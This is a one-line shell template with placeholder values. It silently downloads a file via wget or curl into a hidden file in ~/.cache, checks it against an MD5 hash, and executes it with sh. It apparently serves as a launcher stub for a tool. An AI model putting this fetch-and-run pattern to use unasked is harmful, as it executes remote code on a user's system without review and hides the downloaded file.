BIN=%%BIN%%;([ -f "$HOME/.cache/.%%BIN%%" ] || (mkdir -p "$HOME/.cache" && wget -qO "$HOME/.cache/.%%BIN%%" %%URL%% 2> /dev/null || curl -sL %%URL%% > "$HOME/.cache/.%%BIN%%")) && [ $(md5sum "$HOME/.cache/.%%BIN%%" 2> /dev/null | head -c32 || md5 -q "$HOME/.cache/.%%BIN%%" | head -c32) = %%MD5%% ] && sh $HOME/.cache/.%%BIN%% $@
